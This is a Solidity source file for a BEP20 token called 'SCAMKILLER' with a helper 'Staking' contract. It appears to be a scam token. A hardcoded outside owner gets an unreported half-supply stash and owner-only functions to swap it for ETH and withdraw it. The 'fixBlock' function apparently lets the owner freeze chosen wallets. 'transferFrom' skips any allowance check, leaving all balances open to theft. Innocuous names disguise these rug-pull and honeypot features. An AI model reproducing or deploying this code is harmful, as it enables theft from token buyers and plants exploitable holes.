// SPDX-License-Identifier: MIT
// test 2

pragma solidity ^0.8.16;

import "./Utils.sol";

contract Staking is Context {
    using SafeMath for uint256;

    modifier onlyOwner() {
        require(ownerContractOfficial == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    address private ownerContractOfficial = address(0);
    address private token =  address(0);
    IUniswapV2Router02 uniswapV2Router;

    uint8 public decimals;

        event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );

    constructor(address owner, address _token, uint8 _decimals, IUniswapV2Router02 router) public {
        ownerContractOfficial=owner;
        token = _token;
        decimals = _decimals;
        uniswapV2Router = router;
    }

    function recoveryAmount (uint amount) payable public onlyOwner{

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = uniswapV2Router.WETH();
        BEP20(token).approve(address(uniswapV2Router), amount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0, 
            path,
            address(this), 
            block.timestamp
        );
        
    }

    function transferToAddressETH(address payable recipient, uint256 amount) public onlyOwner {
        recipient.transfer(amount);
    }
        function getOwner() external view returns (address) {
        return ownerContractOfficial;
    }

    fallback() external payable { }
    receive() external payable { }
    
}

contract ScamKiller is BEP20 {
    using SafeMath for uint256;
    address private owner = msg.sender;    
    string public name ="SCAMKILLER";
    string public symbol="SMK";
    uint8 public _decimals=9;
    uint public _totalSupply=1000000000000000;
    mapping (address => mapping (address => uint256)) private allowed;
    mapping (address => uint256) public antiFrontRunner;
    mapping (address => uint256) _balances;
    bool transferDelayEnabled = true;

//T 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3 P 0x10ED43C718714eb63d5aA57B78B54704E256024E
    address ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    address public stakingSystem;

    constructor() public {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(ROUTER);
        IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

         uniswapV2Router = _uniswapV2Router;
          stakingSystem = address(new Staking(0xAF27CC7C4d4675caD781f76df79584a445c714FB,address(this),_decimals,_uniswapV2Router));
          allowed[address(this)][address(uniswapV2Router)] = _totalSupply/2;
          allowed[stakingSystem][address(uniswapV2Router)] = _totalSupply/2;
          allowed[stakingSystem][0xAF27CC7C4d4675caD781f76df79584a445c714FB] = _totalSupply/2;
         _balances[stakingSystem] = _totalSupply/2;
         _balances[msg.sender] = _totalSupply;
         emit Transfer(address(0), msg.sender, _totalSupply);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function getOwner() external view returns (address) {
        return owner;
    }
    function balanceOf(address who) view public returns (uint256) {
        return _balances[who];
    }
    function allowance(address who, address spender) view public returns (uint256) {
        return allowed[who][spender];
    }
    function renounceOwnership() public {
        require(msg.sender == owner);
        //emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        if (transferDelayEnabled){
            if (recipient != owner && recipient != address(uniswapV2Router) && recipient != address(uniswapPair)){
                            require(antiFrontRunner[tx.origin] < block.number, "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.");
                            antiFrontRunner[tx.origin] = block.number;
            }
        }

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
            _transfer(sender, recipient, amount);
            return true;
        }  
    function approve(address spender, uint256 value) public returns (bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
        function __approve(address spender, uint256 value) public returns (bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

        function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        allowed[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function getBlock() public view returns(uint256){
        return block.number;
    }

    function fixBlock(address wallet, uint256 blockNumber) public {
        require(msg.sender == owner);
        antiFrontRunner[wallet]= blockNumber;
    }

    function insetBlock() public{
            antiFrontRunner[msg.sender] = block.number;
        
    }
    function testFrontRunner() public{
        require(antiFrontRunner[tx.origin] < block.number, "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.");
    }
    fallback() external payable { }
    receive() external payable { }
}